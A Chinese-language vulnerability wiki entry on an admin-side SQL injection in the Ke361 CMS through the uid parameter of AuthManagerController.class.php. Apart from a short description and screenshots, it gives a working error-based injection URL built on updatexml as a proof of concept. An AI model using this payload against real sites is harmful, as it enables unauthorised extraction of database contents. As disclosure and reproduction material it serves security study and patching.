---
title: "Ke361 AuthManagerController.class.php 后台SQL注入漏洞"
date: 2026-10-12 09:00:37
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "Ke361"
tags:
  - "Ke361"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Ke361 AuthManagerController.class.php uid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息

## 漏洞影响

```
Ke361
```

## 环境搭建

https://gitee.com/jcove/ke361

## 漏洞复现

存在漏洞的文件为 `Application/Admin/Controller/AuthManagerController.class.php`

![image-20220518153054883](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181530959.png)

```
/admin.php?s=/AuthManager/group/uid/1')%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
```

![image-20220518153112030](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181531098.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/Ke361-AuthManagerController.class.php-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
